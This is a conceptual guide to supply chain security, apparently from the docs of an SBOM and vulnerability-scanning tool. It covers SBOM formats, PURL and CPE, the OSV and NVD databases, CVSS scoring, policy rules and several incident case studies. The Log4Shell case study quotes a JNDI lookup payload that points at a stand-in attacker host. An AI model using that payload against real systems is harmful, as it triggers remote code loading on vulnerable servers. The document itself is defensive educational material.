# Core Security Concepts

This document covers the security fundamentals behind SBOM generation and vulnerability matching. These aren't abstract definitions. Each concept ties directly to code in this project and to real incidents where these ideas either saved organizations or, more often, where the absence of them caused damage.

## Software Supply Chain Security

### What It Is

Your application is mostly code you didn't write. A typical Node.js project pulls in hundreds of transitive dependencies. A Go project with two direct dependencies might resolve to a dozen indirect ones. A Python project with `requests` in its `pyproject.toml` brings in `urllib3`, `certifi`, `charset-normalizer`, and `idna` behind the scenes.

Supply chain security is about knowing what's in that dependency tree, whether any of it is vulnerable, and whether you can trust the chain of custody from the original author to your production build.

### Why It Matters

The attack surface of modern software has shifted. Attacking a well-defended application directly is hard. Compromising one of its 300 dependencies, especially a transitive one that nobody is watching, is much easier.

**The math works in the attacker's favor:** if you depend on 300 packages and each has a 0.1% chance of being compromised in a given year, you have a 26% chance of pulling in a compromised dependency. That's not a hypothetical. The npm ecosystem alone saw 700+ malicious packages published in 2022.

### How It Works in This Project

Bomber addresses three layers of the supply chain problem:

```
Layer 1: Visibility          → What dependencies do I have?
  bomber scan ./project         (parser + scanner packages)

Layer 2: Documentation       → Can I prove what's in my software?
  bomber generate ./project     (sbom package, SPDX/CycloneDX output)

Layer 3: Risk Assessment     → Are any of these dependencies vulnerable?
  bomber vuln ./project         (vuln package, OSV/NVD queries)
  bomber check ./project        (policy package, CI/CD gates)
```

Each layer maps to specific packages in the codebase:
- **Visibility**: `internal/parser/` (ecosystem-specific parsers), `internal/scanner/` (directory walker), `internal/graph/` (graph construction)
- **Documentation**: `internal/sbom/` (SPDX 2.3 and CycloneDX 1.5 generators)
- **Risk Assessment**: `internal/vuln/` (OSV and NVD clients, CVSS calculator, cache), `internal/policy/` (policy engine)

## Software Bill of Materials (SBOM)

### What It Is

An SBOM is a machine-readable inventory of every component in a piece of software: package names, versions, suppliers, checksums, relationships between packages, and licensing information. Think of it like a nutritional label for software.

The concept existed for decades in manufacturing (bill of materials for physical products), but it became a formal requirement for software after Executive Order 14028 (May 2021), which mandated SBOMs for any software sold to the US federal government.

### Why It Matters

Without an SBOM, answering "does our software use Log4j?" requires digging through build files, container images, and deployment manifests across every service you run. With an SBOM, it's a `grep` or a database query.

**Executive Order 14028** came directly after the SolarWinds attack. The order requires SBOMs in a "machine-readable format" for federal software procurement. NTIA published minimum elements: supplier name, component name, version, unique identifier, dependency relationship, author, and timestamp. Bomber's SPDX and CycloneDX output includes all of these.

### The Two Dominant Formats

Two standards have emerged for SBOM encoding, and Bomber supports both.

**SPDX (Software Package Data Exchange)** - An ISO standard (ISO/IEC 5962:2021) originally developed by the Linux Foundation. SPDX is license-focused in its heritage, with strong support for license expressions and file-level analysis. Bomber generates SPDX 2.3 JSON at `internal/sbom/spdx.go`.

Key SPDX elements Bomber produces:
- `spdxVersion: "SPDX-2.3"` and `dataLicense: "CC0-1.0"` (required header fields)
- `documentNamespace` with a SHA-256 hash for uniqueness
- `packages` array with `SPDXID`, name, version, download location, checksums, and external references (PURL)
- `relationships` of type `DESCRIBES` (document-to-root) and `DEPENDS_ON` (parent-to-child)

**CycloneDX** - An OWASP standard purpose-built for security use cases. CycloneDX was designed from the start for vulnerability tracking, with native support for vulnerability data, services, and composition analysis. Bomber generates CycloneDX 1.5 JSON at `internal/sbom/cyclonedx.go`.

Key CycloneDX elements Bomber produces:
- `bomFormat: "CycloneDX"` and `specVersion: "1.5"`
- `serialNumber` with a UUID for document identity
- `metadata` with tool information and timestamp
- `components` array with type, name, version, PURL, bom-ref, and hashes
- `dependencies` array mapping each component to its dependents

### Choosing Between Them

| Aspect | SPDX | CycloneDX |
|--------|------|-----------|
| Standards body | ISO, Linux Foundation | OWASP |
| Primary focus | License compliance | Security analysis |
| Government adoption | Required by NTIA minimum elements | Supported alongside SPDX |
| Vulnerability support | Via external references | Native vulnerability fields |
| JSON schema | More verbose | More compact |

In practice, many organizations generate both. Bomber supports this with the `--sbom-format` flag.

## Package URL (PURL)

### What It Is

PURL is a standardized scheme for identifying software packages across ecosystems. It follows the format:

```
pkg:<type>/<namespace>/<name>@<version>?<qualifiers>#<subpath>
```

Examples from Bomber's parsers:
- Go: `pkg:golang/github.com/spf13/cobra@v1.10.2`
- npm: `pkg:npm/express@4.18.2`
- npm scoped: `pkg:npm/%40angular/core@17.0.0` (@ is percent-encoded)
- PyPI: `pkg:pypi/requests@2.31.0`

### Why It Matters

Before PURL, there was no universal way to say "this Go module" and "this npm package" using the same syntax. Vulnerability databases needed separate endpoints for each ecosystem. SBOM formats needed different fields for different package types.

PURL solves this by providing a single URI scheme that vulnerability databases (OSV, NVD) accept directly. When Bomber sends a batch query to OSV at `internal/vuln/osv.go`, it sends PURLs:

```json
{
  "queries": [
    {"package": {"purl": "pkg:golang/golang.org/x/net@v0.1.0"}},
    {"package": {"purl": "pkg:npm/express@4.18.2"}}
  ]
}
```

### How Bomber Constructs PURLs

Each parser builds PURLs from the parsed manifest data:

- **Go** (`internal/parser/gomod.go`): `fmt.Sprintf("pkg:golang/%s@%s", name, version)` - Uses the Go module path directly as the PURL namespace+name
- **Node** (`internal/parser/node.go`): `fmt.Sprintf("pkg:npm/%s@%s", encodePURLName(name), version)` - Scoped packages (`@org/pkg`) get the `@` percent-encoded to `%40`
- **Python** (`internal/parser/python.go`): `fmt.Sprintf("pkg:pypi/%s@%s", normalizedName, pkg.Version)` - Names are lowercased per PyPI normalization rules

### Common Pitfalls

**Pitfall: Not normalizing package names**

PyPI treats `Requests`, `requests`, and `REQUESTS` as the same package. npm treats scoped packages (`@angular/core`) differently from unscoped ones. If you don't normalize before constructing PURLs, you'll get cache misses and duplicate vulnerability matches.

Bomber handles this in `internal/parser/python.go` by lowercasing all Python package names, and in `internal/parser/node.go` with the `encodePURLName` function that percent-encodes the `@` prefix for scoped packages.

## Dependency Graphs

### What They Are

A dependency graph is a directed graph where nodes are packages and edges represent "depends on" relationships. The root node is your project. Direct dependencies are one edge away from root. Transitive dependencies are everything else.

```
Your Project (depth 0)
├── express@4.18.2 (depth 1, direct)
│   ├── body-parser@1.20.1 (depth 2, transitive)
│   │   └── bytes@3.1.2 (depth 3, transitive)
│   └── accepts@1.3.8 (depth 2, transitive)
│       └── mime-types@2.1.35 (depth 3, transitive)
└── lodash@4.17.20 (depth 1, direct)
```

### Why Depth Matters

The `event-stream` attack in 2018 worked because the malicious code was injected at depth 2: `event-stream` depended on `flatmap-stream`, which contained the payload. Most developers who used `event-stream` never looked at what `flatmap-stream` did.

Bomber tracks depth via BFS traversal at `internal/parser/gomod.go` (`computeDepthLevels`). The policy engine at `internal/policy/engine.go` can enforce a maximum depth with the `max_depth` rule. If your dependency tree goes deeper than your threshold, `bomber check` fails with exit code 1.

### Cycle Detection

Dependency graphs shouldn't have cycles, but lockfile bugs and ecosystem-specific quirks can create them. A cycle (A depends on B, B depends on C, C depends on A) makes depth computation impossible and can break tools that walk the graph naively.

Bomber detects cycles using DFS at `internal/graph/graph.go` (`DetectCycles`). It tracks visited nodes and an "in-stack" set. If DFS encounters a node already in the current stack, that's a cycle. The terminal report at `internal/report/terminal.go` warns when cycles are found.

## Vulnerability Databases

### OSV (Open Source Vulnerabilities)

OSV is Google's open vulnerability database. It's the primary data source for Bomber because it supports batch queries (up to 1000 packages per request) and accepts PURLs directly.

**How Bomber uses OSV:**

```
Client sends POST to https://api.osv.dev/v1/querybatch
  → Body: {"queries": [{"package": {"purl": "pkg:golang/..."}}, ...]}
  ← Response: {"results": [{"vulns": [{"id": "GO-2023-2102", ...}]}, ...]}
```

The batch API is efficient. One HTTP request covers your entire dependency tree. The response includes vulnerability IDs, CVSS severity data, affected version ranges, fix versions, and cross-references to CVE and GHSA identifiers.

OSV covers: Go, npm, PyPI, crates.io, Maven, NuGet, RubyGems, and more. It aggregates data from ecosystem-specific databases (Go Vulnerability Database, GitHub Advisory Database, PyPI Advisory Database).

### NVD (National Vulnerability Database)

NVD is NIST's comprehensive vulnerability database. It's the authoritative source for CVE records and includes CVSS scoring data that OSV sometimes lacks.

**How Bomber uses NVD:**

NVD doesn't support PURL. Instead, Bomber constructs a CPE (Common Platform Enumeration) string at `internal/vuln/nvd.go` (`buildCPEString`):

```
pkg:golang/golang.org/x/net@v0.1.0
  → cpe:2.3:a:*:net:0.1.0:*:*:*:*:*:*:*
```

NVD queries are per-package (no batching), and rate limits are strict: 1 request per 1.7 seconds without an API key, 5 requests per second with one. Bomber implements rate limiting with a mutex-protected timer at `internal/vuln/nvd.go` (`rateLimit`).

### Deduplication

When both OSV and NVD return results for the same vulnerability, Bomber deduplicates using alias matching. OSV might report `GO-2023-2102` with aliases `["CVE-2023-44487", "GHSA-qppj-fm5r-hxr3"]`, and NVD might report `CVE-2023-44487` directly. The `deduplicateMatches` function at `internal/cli/vuln.go` checks all IDs and aliases, keeping the entry with the higher CVSS score or the one with fix version information.

## CVSS v3.1 Scoring

### What It Is

The Common Vulnerability Scoring System (CVSS) is a standardized method for rating the severity of software vulnerabilities. Version 3.1 produces a score from 0.0 to 10.0 based on eight metrics about how an attack works and what damage it causes.

### The Eight Base Metrics

A CVSS v3.1 vector string encodes all eight metrics:

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
          │    │    │    │    │   │   │   └─ Availability: High
          │    │    │    │    │   │   └───── Integrity: None
          │    │    │    │    │   └───────── Confidentiality: None
          │    │    │    │    └───────────── Scope: Unchanged
          │    │    │    └────────────────── User Interaction: None
          │    │    └─────────────────────── Privileges Required: None
          │    └──────────────────────────── Attack Complexity: Low
          └───────────────────────────────── Attack Vector: Network
```

This vector describes CVE-2023-44487 (HTTP/2 Rapid Reset): a network-accessible attack, requiring no privileges or user interaction, with low complexity, that causes a denial of service (high availability impact) but doesn't leak or modify data. Score: 7.5 (HIGH).

### How Bomber Calculates Scores

Bomber implements the full CVSS v3.1 base score formula at `internal/vuln/cvss.go`. The calculation works in three steps:

**Step 1: Parse the vector into numeric weights**

Each metric value maps to a weight defined by the CVSS specification. For example, Attack Vector: Network maps to 0.85, Physical maps to 0.20. Bomber stores these in lookup maps (`avWeights`, `acWeights`, etc.).

**Step 2: Calculate Impact Sub-Score (ISS) and Exploitability**

```
ISS = 1 - ((1 - C) * (1 - I) * (1 - A))

If Scope = Unchanged:
  Impact = 6.42 * ISS
If Scope = Changed:
  Impact = 7.52 * (ISS - 0.029) - 3.25 * (ISS - 0.02)^15

Exploitability = 8.22 * AV * AC * PR * UI
```

**Step 3: Combine and round**

```
If Scope = Unchanged:
  Score = min(Impact + Exploitability, 10)
If Scope = Changed:
  Score = min(1.08 * (Impact + Exploitability), 10)

Final = roundUp(Score)   # CVSS-specific round-up to 1 decimal
```

The `cvssRoundUp` function at `internal/vuln/cvss.go` implements the CVSS specification's rounding rule: `ceil(score * 10) / 10`.

### Severity Buckets

Scores map to severity labels:

| Score Range | Severity |
|-------------|----------|
| 9.0 - 10.0 | CRITICAL |
| 7.0 - 8.9 | HIGH |
| 4.0 - 6.9 | MEDIUM |
| 0.1 - 3.9 | LOW |
| 0.0 | NONE |

Bomber uses these at `internal/vuln/osv.go` (`scoreToSeverity`) and the policy engine compares against them at `internal/policy/engine.go`.

## CPE (Common Platform Enumeration)

### What It Is

CPE is an older naming scheme for software products used by NVD. While PURL is ecosystem-aware (`pkg:npm/express@4.18.2`), CPE uses a generic format:

```
cpe:2.3:a:<vendor>:<product>:<version>:*:*:*:*:*:*:*
```

### Why It's Imperfect

The fundamental problem: CPE requires knowing the vendor and product name as NVD records them, which doesn't always match what the package manager calls them. `golang.org/x/net` becomes `cpe:2.3:a:*:net:0.1.0:...` in Bomber's CPE builder, using a wildcard for vendor and the last path segment for product. This is a best-effort heuristic.

This is why OSV (which uses PURL natively) is Bomber's primary data source, and NVD is supplementary.

## Policy-as-Code for CI/CD

### What It Is

Policy-as-code means expressing security requirements as machine-readable rules that automated tools evaluate. Bomber's policy engine at `internal/policy/engine.go` evaluates three rule types:

```yaml
max_severity: medium    # fail if any vuln exceeds this severity
max_depth: 5            # fail if dependency depth exceeds this
max_age_days: 365       # fail if any vuln is older than this
```

### Why It Matters

Manual vulnerability review doesn't scale. A team of five developers can't evaluate 200 vulnerability findings on every PR. Policy-as-code lets you define acceptable risk levels once and enforce them automatically.

The `max_severity` rule is the most common. Setting `max_severity: medium` means you accept medium-severity vulnerabilities but reject anything high or critical. This is a deliberate trade-off: blocking all vulnerabilities would break most CI pipelines because transitive dependencies frequently carry low-severity findings.

The `max_depth` rule is unique to Bomber. It acknowledges that vulnerabilities in direct dependencies (depth 1) are your immediate responsibility, while vulnerabilities at depth 5+ may be impractical to address. Setting a depth limit forces your team to keep the dependency tree shallow, which reduces supply chain risk surface.

The `max_age_days` rule enforces a remediation window. If a vulnerability was published more than 365 days ago and you still haven't fixed it, the policy fails. This catches the "known for years, never patched" class of vulnerabilities that attackers love.

## How These Concepts Relate

```
Supply Chain Security
    ↓
  requires visibility into
    ↓
Dependency Graphs (depth, cycles, transitive chains)
    ↓
  documented as
    ↓
SBOMs (SPDX 2.3, CycloneDX 1.5)
    ↓
  identified by
    ↓
PURLs (universal package addressing)
    ↓
  queried against
    ↓
Vulnerability Databases (OSV via PURL, NVD via CPE)
    ↓
  scored using
    ↓
CVSS v3.1 (severity quantification)
    ↓
  enforced by
    ↓
Policy Engine (CI/CD gates)
```

## Industry Standards and Frameworks

### OWASP Top 10

This project directly addresses:
- **A06:2021 - Vulnerable and Outdated Components** - The entire purpose of Bomber. Identifies known vulnerabilities in dependencies and enforces policies around them.

### MITRE ATT&CK

Relevant techniques:
- **T1195.002 - Supply Chain Compromise: Compromise Software Supply Chain** - The threat model Bomber defends against. By generating SBOMs and checking vulnerabilities, organizations can detect compromised or vulnerable components before deployment.

### CWE

Common weakness enumerations covered:
- **CWE-1104 - Use of Unmaintained Third-Party Components** - The `max_age_days` policy rule catches vulnerabilities in components that haven't been updated despite known issues.
- **CWE-937 - Using Components with Known Vulnerabilities** - The core functionality of `bomber vuln` and `bomber check`.

### NIST SSDF (Secure Software Development Framework)

- **PS.3.1** - "Acquire and maintain well-secured software components." Bomber provides the verification layer for this practice.
- **PW.4.1** - "Check that software components are not known to contain vulnerabilities." Direct match for `bomber vuln`.

## Real World Examples

### Case Study 1: Log4Shell (CVE-2021-44228)

**What happened:** In December 2021, a critical RCE vulnerability was disclosed in Apache Log4j, a near-universal Java logging library. CVSS: 10.0. An attacker could execute arbitrary code by sending a crafted string (like `${jndi:ldap://attacker.com/a}`) that the library would attempt to resolve, triggering remote code loading.

**Why SBOMs mattered:** The hardest part of Log4Shell response wasn't patching. It was finding where Log4j existed. Large enterprises had thousands of applications, and Log4j was typically a transitive dependency buried two or three levels deep. Organizations with SBOMs could query them programmatically. Everyone else spent the weekend grepping JAR files.

**Connection to this project:** Bomber's dependency graph with `DepthLevel` tracking would surface Log4j regardless of depth. The policy engine's `max_depth` rule could have flagged projects with excessively deep dependency trees as higher risk before the vulnerability was even disclosed.

### Case Study 2: Colors and Faker (npm, January 2022)

**What happened:** The maintainer of the `colors` and `faker` npm packages deliberately sabotaged them, pushing versions that printed garbled text or entered infinite loops. Both packages had millions of weekly downloads. The sabotage cascaded through the npm ecosystem because these were common transitive dependencies.

**Why SBOMs mattered:** Organizations needed to immediately answer "do any of our services depend on `colors` or `faker`?" An SBOM query makes this trivial. Without one, teams had to audit `package-lock.json` files across every repository.

**Connection to this project:** Bomber generates SBOMs that include every transitive dependency with its exact version. A CycloneDX or SPDX document produced by Bomber for any affected project would have listed `colors` or `faker` in the components list, enabling instant triage.

### Case Study 3: ua-parser-js (npm, October 2021)

**What happened:** Attackers compromised the npm account of the `ua-parser-js` maintainer and published versions 0.7.29, 0.8.0, and 1.0.0 containing cryptocurrency mining and credential-stealing malware. The package had 8 million weekly downloads.

**Why version pinning isn't enough:** Even with exact version pinning in `package.json`, if your lockfile wasn't committed or if a fresh install happened during the compromise window, you pulled the malicious version. An SBOM generated at build time would capture the exact versions resolved, creating an auditable record of what was actually used.

## Testing Your Understanding

Before moving to the architecture, make sure you can answer:

1. What is the difference between PURL and CPE, and why does Bomber use both?
2. If a vulnerability has CVSS vector `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`, what is its score and why?
3. Why does Bomber's policy engine include a `max_depth` rule, and what real-world attack does it mitigate?
4. When Bomber gets results from both OSV and NVD for the same vulnerability, how does it decide which to keep?

## Further Reading

**Essential:**
- [SPDX Specification v2.3](https://spdx.github.io/spdx-spec/v2.3/) - The full SPDX standard, useful for understanding output format
- [CycloneDX v1.5 Specification](https://cyclonedx.org/docs/1.5/json/) - CycloneDX JSON schema and field definitions
- [PURL Specification](https://github.com/package-url/purl-spec) - The universal package identifier spec
- [OSV API Documentation](https://osv.dev/docs/) - The vulnerability database API Bomber uses as its primary source

**Deep dives:**
- [CVSS v3.1 Specification](https://www.first.org/cvss/v3.1/specification-document) - The full scoring specification, including the equations Bomber implements
- [NVD API v2.0 Documentation](https://nvd.nist.gov/developers/vulnerabilities) - The NVD REST API that Bomber uses for supplementary data
- [Executive Order 14028](https://www.whitehouse.gov/briefing-room/presidential-actions/2021/05/12/executive-order-on-improving-the-nations-cybersecurity/) - The US executive order that mandated SBOMs

**Historical context:**
- [The Update Framework (TUF)](https://theupdateframework.io/) - A framework for securing software update systems, relevant background for understanding supply chain trust
- [Reflections on Trusting Trust](https://www.cs.cmu.edu/~rdriley/487/papers/Thompson_1984_ReflsOnTrustingTrust.pdf) - Ken Thompson's 1984 Turing Award lecture on the fundamental limits of software trust
